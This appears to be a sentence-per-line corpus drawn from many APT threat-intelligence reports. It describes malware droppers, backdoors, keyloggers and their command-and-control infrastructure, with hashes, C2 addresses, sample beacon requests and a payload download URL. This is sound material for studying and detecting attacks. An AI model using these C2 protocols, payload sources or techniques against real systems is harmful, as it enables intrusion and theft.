Once injected into the services.exe process , a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver .
Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes .
Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files .
This allows us to draw the following diagram of the C & C infrastructure as of November 2012 : For the Command and Control servers , the various generations of the backdoor connect to different scripts : For instance , the script `` /cgi-bin/nt/th '' is being used to receive commands from the command-and- control server , usually in the form of new plugins to run on the victim 's computer .
Most `` interesting '' out of those are : A list of the most popular domains used for command and control can be found below : Interestingly , although the domain `` dll-host-update.com '' appears in one of the malware configurations , it had not been registered by the attackers .
The main difference between these categories is their behavior on the infected system : `` Offline '' : exists as files on local disk , capable of creating its own system registry keys , local disk log files , and may communicate with C & C servers on their own .
The initial payload in that case was a mail attachment , an exploited PDF file ( readme.pdf , md5 72bdca7dd12ed04b21dfa60c5c2ab6c4 ) which downloaded and decoded an encoded blob ( md5 ec16143a14c091100e7af30de03fce1f ) from the site www.humanright-watch.org , not to be confused with the legitimate Human Rights ' Watch website hrw.org .
The decoded file was a Maudi dropper , self-signed using the name `` soft @ hotmail.com '' , and the dropped component belonged to the `` JinDiQIAO @ hotmail.com '' -signed cluster .
For example , the malware dropper cc1a806d25982acdb35dd196ab8171bc , a WinRAR SFX executable installed through the use of the Word exploit CVE-2012-0158 , contained a PlugX component configured to connect to ppt.bodologetee.com .
The malware is a '' root kit '' that hides the presence of the spying operation and also creates a hidden , encrypted file system to store stolen data and tools used by the attackers , he said .
Chien said that in some cases when a command and control server was taken offline , Turla 's operators have quickly pushed out new versions of the malware that directed infected computers to new command and control servers .
Hackers use Turla to establish a hidden foothold in infected networks from which they can search other computers , store stolen information , then transmit data back to their servers .
This Trojan.APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443 .
MD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both Trojan.APT.9002 variants and connect to a command and control server at 58.64.143.244 .
This variant connected to a command and control server at ad04.bounceme.net .
Some of C & C servers that we have seen from our accumulated data are as follows : To start its connection to its C & C server , the backdoor component will first send 5-bytes ( \x01\x00\x00\x00\x33 ) .
The backdoor then replies with a beacon message , the contents of which are as follows : Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns , which is recognizable by the C & C server and/or attacker .
It then collects autocomplete entries from the following registry key : It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API .
'' Of all the samples we 've tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .
The different ways it collects information from the infected machine are as follows : yy Keylogger yy Taking screenshots yy Stealing data from clipboard yy Stealing files yy Stealing PKI certificates and associated private keys yy Stealing usernames and passwords from browsers , instant messengers and email clients yy Stealing WLAN passwords yy Stealing Windows password hashes The information collected by the malware is automatically uploaded to remote servers via FTP .
Once launched , the file drops the malware onto the system ( such files are therefore referred to as droppers in the rest of this documents ) .
The data collection components include a keylogger , clipboard stealer , screenshotter , and password stealers for a variety of popular chat , email and web browsing programs .
The following is the summary of potential detection steps : • Check if there is only one GET parameter • ( check if path is not empty and contains index.php ) ( possible , but not confirmed ) • convert the Base64-like GET parameter string into real Base64 encoding , and check if it decodes correctly • check if the decoded string has at least two delimieter character `` | '' in it • check if after the last but first `` | '' character , there are digits only • check if the version part of the string follows the format `` 1.11 '' or similar The header sent is fairly standard , but we include one example nonetheless : The used Agent strings vary significantly across queries , therefore they can not be really used for detection : The Google search step also uses different agent strings : The C & C server 's response – if it sends encrypted files – is a GIF file containing a small icon , and after that , the malware : For stage 3 ( i.e. , < id > .gif
Address and open port information is below : Basic detection can be based on 3 queries that are initiated by the victim computers within seconds .
Commands received via this channel trigger the download of stage 2 and stage 3 code from the C & C server .
Nullsoft is a script-driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system .
The server executable is responsible for installing the 9002 payload malware , and has its configuration block stored in its .data
When the threat actor builds a malware executable , the builder writes the server executable to disk and overwrites the configuration block with the newly configured options .
The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file .
Going back to the malware process tree we can see that Binder launches the following command , which is instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll , obtain the function address of the native API named `` 78121 '' via GetProcAddress ( ) , and call the function pointer of the entry point `` 78121 '' .
Sayad Client DLL 's main entry point initializes and starts up all data collection methods that the assembly implements .
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- New Session : % fully qualified computer name % % timestamp % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- It then creates a hidden console window and registers its only export _LowLevelKeyboardProc @ 12 as a hook procedure for low-level keyboard input events ( WH_KEYBOARD_LL hook ) .
The sample analyzed carried a Web browser password recovery tool originating from http : //securityxploded.com/browser-password-decryptor.php • The RunExeCmdSingle component is a DLL file that drops and executes another executable .
The following are examples of a POST request and a POST response : POST request example : POST /wp08/wp-includes/dtcla.php ? id=285745296322896178920098FD80-20 & v1=038 & v2=17 0393861 & q=5265882854508EFCF958F979E4 HTTP/1.1 User-Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en-US ) AppleWebKit/525.19 ( KHTML , like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host : toons.freesexycomics.com Content-Length : 0 Cache-Control : no-cache POST response example : HTTP/1.1 200 OK Date : Wed , 22 Jan 2014 13:40:48 GMT Content-Type : text/html Transfer-Encoding : chunked Connection : keep-alive Server : Apache/1.3.37 ( Unix ) Cache-Control : no-cache 9f65 < html > < head > < mega http-equiv='CACHE-CONTROL ' content='NO-CACHE ' > < / head > < body > No data ! < ! -- havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ...
identifiant=51032 _ 175129256364 Example POST request for C & C server check-in POST /check _ value.php HTTP/1.1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET
- % TEMP % \AdobeARM.exe - % TEMP % \iTunesHelper.exe - % PROGRAMS % \Startup\AdobeRe.exe - rouj.exe - % USERPROFILE % \Local Settings\iexplore.exe - % USERAPPDATA % \Microsoft\wuauclt.exe - % PROGRAMS % \Startup\adobeup.exe - % TEMP % \AdobeUpdater.exe - NTLMSVC.DLL - % PROGRAMS % \Startup\adobe_sl.lnk - % TEMP % \runinfo.exe Product : SoundMAX service agent Description : Microsoft NTLM Service Holder Product & Description : JpgAsp System based indications of possible compromise by the comment crew attackers .
This document details the following types of indictors : - Network - File - System - Email The contents of this document are indicators only and may match legitimate services or applications .
Network based indications of possible compromise by the comment crew attackers .
When executed , the original sample created another executable file in the Windows ' temporary folder ( C : \Users\ [ USERNAME ] \AppData\Local\Temp ) named `` Trojan.exe '' , which corresponds to the code of the RAT itself .
The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection .
Captured information is sent to a dynamic domain corresponding to the host `` hacars11.no-ip.biz '' , using local port 1177 with no SSL encryption ( but base64 encoded ) , making the analysis of the network traffic a much easier task .
Delivery Vector We believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways .
Attacks Guide for CIOs , CFOs , and Enter Poison Ivy CISOs on why traditional security defenses are failing We observed several attacks in June and July 2013 against targets in the Middle East and the U.S. that dropped a and how losing the security PIVY payload that connected to command-­and-­control ( CnC ) infrastructure used by the Molerats attackers .
files containing a key to secure communications between the compromised computer and the attacker 's machine .
Taking a deeper look at the decrypted malicious code , this malware was found to contain at least the following functions : Download file Download and execute or load library Change sleep duration Open and close interactive sessions Malware is increasingly becoming more contextually advanced .
As depicted in the diagram below , the spear phishing document ( which exploits CVE-2012-0158 ) creates a decoy document and a malware dropper named exp1ore.exe .
This malware was analysed to be a backdoor that allows the attacker to remote control the infected system .
Command and Control : During this stage the infected host system establishes a communications channel to a command and control ( C & C ) server operated by the at- tackers .
Once this channel has been established the at- tackers can issue commands and download further mal- ware on to the system Additional attacker actions : After a successful com- promise is established , attackers can conduct a number of actions including ex-ﬁltrating data from the infected host and transmitting it back to attackers through a process of encrypting , compressing , and transferring to a server 2 operated by the attackers .
Second , having participants forward us e-mails does not allow us to verify if the targeted organi- zation was successfully compromised by the attack ( e.g. , if another member of the organization open and executed malware on their machine ) and what the scope of the at- tack was .
Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c Decoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate .
The pages used for phishing typically used obfuscated code to redirect the user to another webpage : In some pages the malicious redirect was disabled by the attackers , by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially .
For example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor .
As a result , it is difficult for a malicious third-party to install an untrusted application , such as a remote access Trojan ( RAT ) , onto a system that is adequately protected with the Bit9 platform .
The attackers bundled this Intel driver application with variants of Backdoor.Moudoor using a popular Chinese archiving application called Haozip .
The other Trojans that share these traits are : • Backdoor.Vasport • Backdoor.Boda File creation template % TEMP % \uid.ax % % TEMP % % \ % s.ax % % TEMP % % \ % s _ p.ax Command and control template POST http : // % ls : % d/ % x HTTP/1.1 Content-Length : 2 CONNECT % ls : % d HTTP/1.1 Connection : keep-alive lynx There is also evidence that Backdoor.Vasport and Trojan .
The feature does the same in OrcaRat : check for some date and time written in a file , and sleep for as long as needed before deleting the aforementioned file .
Actually : and to obtain Di ( the original data that gives us Ei once encrypted ) , we must perform the following operation : where master_key is `` OrcaKiller '' for the OrcaRat sample .
) The real difference lies in the obfuscation of the filename : LeoUncia was using a plain-text filename ( `` readx '' ) , whereas OrcaRat is obfuscating ( just the same way it obfuscates the Campaign ID ) this data : the filename is `` wbt.dat '' ( obfuscated string XORed character-by-character with the XOR key `` product '' ) and it is located in the `` App Data '' folder of the user OrcaRat is running with .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control ( C2 ) server .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server .
cmd.exe /Q is executed in the module XPlugTelnet in order to start a telnet server on the attacked machine .
Sample B , when executed , attempts to load a ﬁle McUtil.DLL from the same directory , which usually is another component of McAfee .
In a next step , svchost.exe is instructed to execute the original msiexec.exe from Microsoft , where also memory is injected like it has been done for svchost.exe .
The function create_from_resources ( ) looks like : Subsequently , after dropping the correct ﬁles , the malware makes itself persistent on the system and creates a service with the following parameters , which loads the ﬁle usbdev.sys as a kernel driver : If during installation anything goes wrong , the registry keys are deleted .
Sample A can be considered an installer or dropper .
In this module , the following transport or communication modules are present : Type 1 : tcp , b2m Type 2 : np , frag , m2b This corresponds to the transports found in Sample D. The compiled code of bzip2/libbzip2 , a program and library for lossless block-sorting data compression , was identiﬁed , coming from http : //svn.apache.org/repos/asf/labs/axmake/trunk/src/libuc++/srclib/bzip2/compress.c .
The backdoor install file and batch file are copied by network sharing , and the batch file is executed with the work scheduler .
The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C & C server .
In addition , a method of installing backdoor only in the memory area was applied , since this can avoid the threat detection of security products .
Quickly considering these results in cursory questions reflected as follows : • Command and Control ( C2 ) appears to be accomplished via providing commands in an encrypted file stored on the local 'master ' system ( re : netsat.exe ) .
Based on available analysis results , netsat.exe could collect surreptitiously gathered data from any infected drive connected to the system whereon netsat.exe was running , e.g. , the infected drive would not have to be processed by the same system whereon it became infected .
Essentially , netsat.exe appeared to operate as a master program that infected removable media connected to the system whereon it was running and collected data from infected drives when the drives returned .
Usually in such cases an attacker will use their access to place an exploit kit on the compromised website , delivering malware to visitors - a technique commonly referred to as setting up a 'watering hole ' or 'strategic web compromise ' .
ScanBox is particularly dangerous as it does n't require malware to be successfully deployed to disk in order to steal information - the keylogging functionality simply requires the JavaScript code to be executed by a web browser .
] com selectively loaded extra plugins from separate files : Figure 1 – The JavaScript function to load additional plugins We can see how these differ by comparing two exploit kits side by side : Figure 2 – foundationssl [ .
Dropped to % PROFILE % \Application Data\Erease.vbe , that connects to the C & C server .
The document starts with the RTF header stuff , followed by the encrypted second stage .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 Dropped to C : \Documents and Settings\All Users\DRM\KavSky\m.exe ( clean loader , digitally signed by Kaspersky ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll ( malware loader ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll.eng ( payload ) ; registered in for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\KavSky → ImagePath The payload is next generation Plugx , plugin function creation dates are 20140719 decimal .
Notably , one of the commands in the Trojan dropper switches the codepage of an infected machine to 1251 before installation .
During lateral movement in a victim 's network , the attackers deploy a module to actively scan the local area network , find hosts vulnerable for MS08-067 ( the vulnerability exploited by Conficker ) or accessible with admin credentials from its own password database .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the true -mothership- command and control server .
The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102 .
One of these Hitkit samples connected to a command and control server at downloadmp3server [ .
We pivoted off the command and control IP addresses used by these samples and found the following known malicious domains recently pointed to 180.150.228.102 .
This file , when opened , exploits one of the above mentioned vulnerabilities and drops the payload file `` msmx21.exe '' .
C & C Server : 29f2aad01fee3663.com McAfee has coverage for this exploit CVE-2011-3544 and detects the downloaded payload used in the targeted attack as BackDoor-FJJ .
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon `` Userinit '' '' C : \WINDOWS\system32\userinit.exe , '' '' C : \WINDOWS\system32\userinit.exe , C : \Program Files \WindowsNT\svchost.exe '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Zeemav : `` '' C : \Documents and Settings\Home\Application Data\Keucot\qagi.exe '' '' Users are requested to exercise caution while opening unsolicited emails and unknown links .
What Can Network Defenders Do ? The relative simplicity of FIN4 's tactics ( spearphishing , theft of valid credentials , lack of any malware installed on victim machines ) makes their intrusion activity difficult to detect .
We have also observed this group send emails with links to fake Outlook Web App ( OWA ) login pages that will also steal the user 's credentials , however we have not observed this tactic in recent months .
These campaign codes are transmitted to FIN4's command and control ( C2 ) servers along with stolen credentials .
All of these files were infected with the known Trojan Virus Havex Rat .
The most recent company known to have their software infected with the Havex backdoor was the German company MB Connect Line GmbH , who are known for their industrial router mbNET and VPN service mbCONNECT24 .
The corrupted eCatcherSetup.exe contained a malware which could , under restricted conditions , compromise the Talk2M login of the infected user .
Subsequently the malware creates and launches a Cabinet Self-Extractor , which drops two additional executable files : one embedding either a PDF or a Microsoft Office Word document , the other being the actual backdoor .
Once executed it drops and launches a batch script in a % Temp % subfolder with the following content : As you can see , it enforces some configuration in the registry in order to hide file extensions and not show hidden folders .
After some quick initialization , the backdoor XORs an embedded string with 0x9D to extract the IP address of the C & C server .
( Source : Dell SecureWorks ) Capabilities The Comfoo RAT has the following features : System/network information gathering Keystroke logging Screenshots File upload/download/execute Command shell By studying the network traffic of infected systems , CTU researchers determined that the server side of the Comfoo malware sends an HTTP server header identifying the server version as `` Apache 2.0.50 ( Unix ) '' .
Network detection A typical Comfoo HTTP phone-home request looks like the following : GET /CWoNaJLBo/VTNeWw11212/12664/12VTNfNmM1aQ/UTWOqVQ132/ HTTP/1.1Accept : image/gif , image/x-xbitmap , image/jpeg , image/pjpeg , */*Accept-Language : en-enUser-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) Host : smtp.dynami‐ clink.ddns.usConnection : Keep-AliveCache-Control : no-cache An active C2 server responds with headers similar to the following : HTTP/1.1 200 OKDate : Mon , 29 Jul 2013 19:26:15 GMTServer : Apache/2.0.50 ( Unix ) Content-Length : 10Keep-Alive : timeout=15 , max=90 Disk/memory/registry detection The unique string T1Y943jIhk can be found in the Comfoo binary .
( Source : Dell Se- cureWorks ) Taking control The unauthenticated nature of the Comfoo relay server 's administrative connections makes it possible to take control of the C2 server and all victims ' systems , armed only with knowledge of the protocol , the encryption method , and the static encryption key hard-coded into every Comfoo binary .
ZxShell employs a strange method for communication : it hooks the NtWriteFile API and recognizes 5 different special handle values as commands : 0x111111111 -- Hide `` Loveusd '' driver from the system kernel driver list 0x22222222 -- Securely delete an in-use or no-access target file-name 0x44444444 -- Unhook the ZwWriteFile API and hook KiFastCallEntry 0x55555555 -- Remove the ZxShell Image Load Notify routine 0x88888888 -- Set a special value called `` type '' in Windows registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain The second Loveusd system thread does a lot of things .
While other techniques are also utilized to conceal and inhibit its removal , ZxShell 's primary functionality is to act as a Remote Administration Tool ( RAT ) , allowing the threat actor to have continuous backdoor access on to the compromised machine .
Further , the keylogging and remote desktop functionality allows the operator to spy on the infected machine , observing all keystrokes and viewing all user actions .
In the aforementioned university-related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
The downloaded plugin file included a variant of Sakula malware .
This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd. Command-and-Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below : Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S.-based IT company with high-profile clients in the defense sector .
Surtr connects to a command and control server ( C2 ) and downloads a stage two component to % ALL USERS % /Application Data/Microsoft/Windows/Burn/_ [ VICTIM COMPUTER NAME ] .log
Surtr 's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine , viewing web cache , executing remote commands and logging keystrokes .
It also creates the following folders : % ALL USERS % /Application Data/Microsoft/Windows/123 % ALL USERS % /Application Data/Microsoft/Windows/Burn % ALL USERS % /Application Data/Microsoft/Windows/LiveUpdata_Mem It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders .
The window screenshot is shown in the figure below : When the attackers gain access to servers running operating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login/password data used to access the servers and provides attackers remote access to the servers .
Ammy Admin was used for remote access , the same SSHD backdoor was installed on Unix servers and , In addi- tion , it was loaded from the same hacked server as in other cases of trojan Anunak usage .
• The malware sends key information , screenshots and CAB-archives to its management server .
Often the user would be presented with a legitimate document or software download they were expecting to see , along with an unseen malicious download .
Targets include government , military , and civilian organizations Spear phishing to carefully-selected target individuals was the primary attack vector identified in the investigation .
The primary purpose of this long-running , global command-and-control net- work appears to be surveillance against national security interests .
If the recipient falls for the scam , Trojan horse , remote access tool ( RAT ) software is installed on the victim 's computer that can give the attacker keystrokes , screenshots , microphone and webcam recordings , stolen documents , and passwords .
And to make matters worse , compromised systems are used as staging grounds for further attacks on regional targets , by installing illicit command-and-control ( CnC ) servers , abusing legitimate email accounts , and disseminating stolen office documents as `` bait .
To compromise its targets , the SEA often sends socially engineered , spear-phishing emails to lure opposition activists into opening fraudulent , weaponized , and malicious documents .
The functionality of the dropper can be summarized in the following steps : • Sandbox check and anti virus product enumeration • Dropping payload 'netmgr.exe' • Creating a registry key for persistence • Creating a registry key for deletion of the dropper Searching for a sandbox environment , the malware takes a number of simple steps to verify .
For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one .
All data exchanged with any of the C & C servers as well as data stored to a file on disk is encrypted with the according key .
5.5 Remote code execution vulnerability After a full analysis of the communication protocol , we identified a vulnerability in the Command & Control executable : The server does not correctly parse the data sent by the infected machine .
Here are some screenshots of the administration interface : Figure 14 : Terminator : List of processes on the infected machine Figure 15 : Terminator : List of opened ports on the infected machine Figure 16 : Terminator : Remote shell on the infected machine Figure 17 : Terminator : Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner We decided to create a scanner to identify the servers which were running Terminator .
We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .
BlackWorm v2.1 has the same abilities as the original version and additional functionality , including bypassing UAC , disabling host firewalls and spreading over network shares .
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload , but does n't allow any configuration other than the IP address for command and control ( C2 ) .
E.exe , ( MD5 : a8cf815c3800202d448d035300985dc7 ) a binary that drew our attention , looked to be a backdoor with the Syrian Malware strings within it .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a `` Browser Patch '' or other similar type of file .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool : You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
e. Download backdoor : Downloads dropper file pao.exe from http : //www.hisunpharm.com/files/File/product/ and stores it to C : \Program Files\tongji2.exe f. Drops and execute batch file : schedules downloader every 30 minutes and ensures svchest.exe is started with Local System privileges .
Although people can be used as the initial point of entry , propagation needs to continue laterally through the network till the specific target host is reached .
During this time attackers used C & C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website .
The sample communicates with a command & control server in Vietnam , and exfiltrates text messages to a Vietnamese telephone number .
The malware communicates with a FinSpy Command & Control server in Ethiopia , which was first identified by Rapid7 in August 2012 .
The attachments we analyzed sent data to a command & control server inside Bahrain .
The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The `` Cohhoc '' malware is a Remote Administration Tool and is able to :  execute commands or scripts ;  download files ;  upload files ;  collect information about the infected system , for example hostname , username , version of the operating system , installed software ;  find specific documents in order to send them to the command and control servers .
If the processes are not running on the infected system , the injection is performed into explorer.exe .
Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .
The config files within BE2 contained the settings of the company 's internal web proxy : As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in-memory ) , the administrators were able to collect BE2 files from the infected machines .
Kaspersky Lab detects 'BlackEnergy3 ' malware as Backdoor.Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first-stage tool on this network .
The comment includes a punchy message for `` kasperRsky '' : Killint.tcl – uses Ciscoapi.tcl , implements destroying functions : The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
The malware is capable of the following cyber-espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
Any communication with them must be considered extremely suspicious java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) Creates the file Java Update.lnk pointing to appdata/Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .
During this investigation , we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign .
The encrypted commands that are accepted are : Sleep : Commands the backdoor to sleep for specified number of minutes We have received a sleep command of `` sleep:120 '' during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C & C server Download : < download_url > Commands the backdoor to download and execute a file ( most probably another Win32 executable ) from a specified URL The C & C servers used in this campaign are found to be newly registered and also short-lived , making it difficult for us to track the malware 's behavior .
This sample drops the file UIODsevr.exe , its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C & C at skys { BLOCKED } com .
When executed , it drops and opens a valid PDF file , which was most probably taken from the target organization 's website .
So , the dropper creates three files in the C : WindowsSystem32 directory : netsvcs.exe - the modified Team Viewer client ; netsvcs_ko.dll - resources library of Team Viewer client ; vcmon.exe - installer/starter ; and creates the service `` Remote Access Service '' , adjusted to execute C : WindowsSystem32vcmon.exe at system startup .
After sending , the malware executes the real Hangul word processing application `` Hwp.exe '' to open the .HWP
It is interesting that the module does not search for all the HWP files on infected computer , but reacts only to those that are opened by the user and steals them .
 Abuse of Code Signing infrastructure to validly sign custom backdoor malware ;  Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol ( RDP ) ;  Long history of IP/DNS telemetry allowing for historical research and link analysis ;  Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass proxy logging ;  Extensive use of time/date stomping of malicious files to hinder forensic analysis ; and  Malware leveraging compromised credentials to bypass authentication NTLM proxies ( proxy aware ) .
This well-known technique that is commonly referred to as the sticky-keys backdoor is used when systems on the targeted organization have Microsoft Remote Desktop Protocol ( RDP ) enabled .
Furthermore , this Trojan also drops a driver file on the system named : { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } .sys
The backdoor connects to the following C2 for instructions : news [ dot ] grouptumbler [ dot ] com/news/feed.php IP : 200.63.46.23 It supports several commands , such as copy file , move file , remove file , make directory , kill process and of course , download and execute new malware .
To gain control at boot , it writes a randomly named LNK file to the startup folder , which in turn calls the main body using rundll32 : In the picture above , the malware 's main body is stored as `` stat.bin '' ( a randomly selected name ) in the `` Adobe '' folder .
While we were analyzing the samples , the attackers connected to the C2 and added a custom backdoor as `` 1109821546.gif '' : `` http : //tsoftonline.com/views/img/1109821546.gif '' HTTP/1.1 200 OK Date : Mon , 25 Feb 2013 12:34:13 GMT Server : Apache Last-Modified : Mon , 25 Feb 2013 10:59:49 GMT ETag : `` 7c8251-5190d-4d68a708d9340 '' Accept-Ranges : bytes Content-Length : 334093 Content-Type : image/gif This custom backdoor , referred to as `` stage 3 '' , is much bigger than the previous ones – 300K+ in size .
Attackers often use publicly available RATs like Gh0st , PoisonIvy , Hupigon , and DRAT , and `` closed-released '' RATs like MFC Hunter and PlugX.1 However , the network traffic these RATs produce is well-known and easily detectable although attackers still successfully use them.2 Attackers always look for ways to blend their malicious traffic with legitimate traffic to avoid detection .
Attackers often use remote access Trojans ( RATs ) , which typically have graphical user interfaces ( GUIs ) and remote desktop features that include directory browsing , file transfer , and the ability to take screenshots and activate the microphone and web camera of a compromised computer .
The following bits of information are initially sent by the compromised host when the communication starts : • User name • Computer name • OEM code page identifier • What looks like a campaign code but only for some samples The commands are not preconfigured as the malware relies on the data sent by the server .
The malware connected to the same command and control server , liumingzhen.zapto.org , but the callback is quite different : XYZ /WinData.DLL ? HELO-STX-1*1 [ IP Address ] * [ Computer Name ] *0605 [ MAC : [ Mac Address ] ] $ In a separate case where liumingzhen.zapto.org has been used as the command and control server , the payload was neither WinData nor Terminator RAT , but another type of malware known as Protux .
As shown in Figure 1 , the adversary sends a malicious Word document , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) , that exploits CVE-2012-0158 , which subsequently drops a malware installer named `` DW20.exe '' .
The RAT ( svchost_.exe ) will collaborate with its relay ( sss.exe ) to communicate with the command and control server .
This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg : http : // < server > /tv/getinfo.php ? id= ...
This module installed with Teamviewer 6 allows the attackers to access computer desktop remotely , activate webcam or microphone , download or upload files to the infected machine and many more .
After that it will connect to the Command and Control ( C2 ) server and fetch updated modules by the following URLs : http : // < server name > / < filename > , where < server name > is a value from tv.cfg file ( newslite.org ) .
Various versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information , such as the following : • Installed mail client • Internet Explorer version • Windows version • Whether a proxy server is configured • Whether a virtual machine was detected In addition to the Base64 data in the URI of the HTTP POST , the BS2005 malware also includes Base64 data in the body of the HTTP POST .
This malware is known as BMW , due to the presence of this PDB string : BMW sample ( 649691e1d367721f0ff899fd31133915 ) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic : The < filename > in the URI is randomly chosen from one of the following hard-coded entries within the malware binary : • acheb.aspx • bajree.aspx • cyacrin.aspx • dauber.aspx • eaves.aspx The Base64 encoded data in the POST body decodes to the following : The < Y/N > data indicates whether the malware is running inside a virtual machine .
MyWeb only encrypts the command results data sent back to the CnC server using the same weak encryption algorithm as BS2005 ( see Figure 2 ) .
The `` msfvenom '' tool transmogrifies a Metasploit payload into a standalone EXE , and with the `` -x '' switch , it 'll fuse the payload- -encoded as desired -- into a copy of an existing executable , exhibiting exactly the behavior we just described .
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US , commingled with the detritus of past attack campaigns and successful compromises .
All around them was a clutter of credential dumps , hacking utilities , RATs , and even legitimate software installers , but the files in question were none of these .
